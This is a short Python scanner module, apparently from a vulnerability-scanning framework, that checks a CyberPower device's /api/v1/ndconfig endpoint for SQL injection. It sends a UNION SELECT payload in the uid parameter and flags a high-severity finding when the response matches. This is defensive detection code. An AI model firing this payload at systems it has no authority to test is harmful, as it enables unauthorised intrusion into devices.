...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CyberPower - SQL Injection Detection',
    ...
    def run(self):
        path = "/api/v1/ndconfig?mode=lean&uid=1'%20UNION%20select%201,2,3,sqlite_version();--"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = (':"finished"', '"success":', 'modifiedtime":',)
        ctype_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='CyberPower - SQL Injection detected',
                path=path,
            )
            return True
        return False
